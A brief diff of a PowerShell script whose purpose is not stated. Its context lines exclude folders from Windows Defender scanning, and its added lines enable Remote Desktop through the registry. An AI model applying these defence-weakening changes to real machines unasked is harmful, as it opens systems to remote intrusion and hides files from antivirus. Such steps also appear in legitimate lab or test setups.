@@ -117,6 +117,13 @@ foreach ($folder in $folders) {
     Add-MpPreference -ExclusionPath “$folder”
     }
 
+## Enable RDP
+$check_rdp = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections
+
+if ($check_rdp -eq 1) {
+    write-host "[*] Enabling RDP"
+    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -name "fDenyTSConnections" -value 0
+}
 
 
 
